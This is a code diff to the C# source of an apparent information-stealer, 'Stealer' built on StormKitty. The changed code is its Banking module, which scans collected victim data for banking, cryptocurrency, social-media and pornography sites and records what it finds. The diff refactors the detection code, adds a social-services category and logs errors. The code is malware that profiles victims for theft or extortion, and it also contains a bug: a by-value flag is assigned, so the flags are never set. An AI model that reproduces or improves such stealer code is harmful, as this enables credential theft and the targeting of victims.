@@ -1,4 +1,5 @@
-﻿using System;
+﻿using StormKitty;
+using System;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
 
@@ -6,11 +7,17 @@ namespace Stealer
 {
     internal sealed class Banking
     {
+        private static char[] InvalidChars = System.IO.Path.GetInvalidPathChars();
+
         // Add value to list
         private static bool AppendValue(string value, List<string> domains)
         {
             string domain = value
                 .Replace("www.", "").ToLower();
+            // Check for invalid chars
+            foreach (char InvalidChar in InvalidChars)
+                if (domain.Contains(InvalidChar.ToString()))
+                    return false;
             // Remove search results
             if (
                 domain.Contains("google") ||
@@ -24,8 +31,8 @@ namespace Stealer
                 domain = domain.Substring(1);
             // Get hostname from url
             try {
-                domain = new System.Uri(domain).Host;
-            } catch (System.UriFormatException) { }
+                domain = new Uri(domain).Host;
+            } catch (UriFormatException) { }
             // Remove .com, .org
             domain = System.IO.Path.GetFileNameWithoutExtension(domain);
             domain = domain.Replace(".com", "").Replace(".org", "");
@@ -39,32 +46,12 @@ namespace Stealer
             return true;
         }
 
-        // Detect crypto currency services
-        private static void DetectCryptocurrencyServices(string value)
-        {
-            foreach (string service in StormKitty.Config.CryptoServices)
-                if (value.ToLower().Contains(service) && value.Length < 25)
-                    if (AppendValue(value, Counter.DetectedCryptoServices))
-                        { Counter.CryptoServices = true; return; }
-        }
 
-
-        // Detect banking services
-        private static void DetectBankingServices(string value)
+        private static void DetectServices(string value, string[] toscan, List<string> detected, bool ondetect)
         {
-            foreach (string service in StormKitty.Config.BankingServices)
+            foreach (string service in toscan)
                 if (value.ToLower().Contains(service) && value.Length < 25)
-                    if (AppendValue(value, Counter.DetectedBankingServices))
-                        { Counter.BankingServices = true; return; }
-        }
-
-        // Detect porn services
-        private static void DetectPornServices(string value)
-        {
-            foreach (string service in StormKitty.Config.PornServices)
-                if (value.ToLower().Contains(service) && value.Length < 25)
-                    if (AppendValue(value, Counter.DetectedPornServices))
-                    { Counter.PornServices = true; return; }
+                    if (AppendValue(value, detected)) { ondetect = true; return; }
         }
 
         // Detect all
@@ -72,12 +59,13 @@ namespace Stealer
         {
             try
             {
-                DetectBankingServices(value);
-                DetectCryptocurrencyServices(value);
-                DetectPornServices(value);
+                DetectServices(value, Config.PornServices, Counter.DetectedPornServices, Counter.PornServices);
+                DetectServices(value, Config.SocialServices, Counter.DetectedSocialServices, Counter.SocialServices);
+                DetectServices(value, Config.BankingServices, Counter.DetectedBankingServices, Counter.BankingServices);
+                DetectServices(value, Config.CryptoServices, Counter.DetectedCryptoServices, Counter.CryptoServices);
             } catch (Exception ex)
             {
-                //Console.WriteLine("Exception while analyzing value : " + value + ", error:\n" + ex);
+                Logging.Log("Banking - ScanData >> Exception while analyzing value '" + value + "'\n" + ex);
             }
         }
 
